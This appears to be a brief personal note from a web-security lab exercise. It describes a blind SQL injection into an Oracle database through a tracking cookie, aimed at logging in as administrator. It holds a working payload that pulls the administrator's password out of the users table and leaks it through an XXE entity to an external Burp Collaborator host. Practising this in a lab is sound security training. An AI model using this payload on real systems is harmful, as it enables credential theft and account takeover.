 Vulnerable parameter is the tracking cookie
 DB has users
 columns username and password
 
 Login as the administrator user
 
 ' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users WHERE username = 'administrator')||'.ulj5yhd5se03xj88tv5vzluyvp1fp4.burpcollaborator.net-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)--
 
 ulj5yhd5se03xj88tv5vzluyvp1fp4.burpcollaborator.net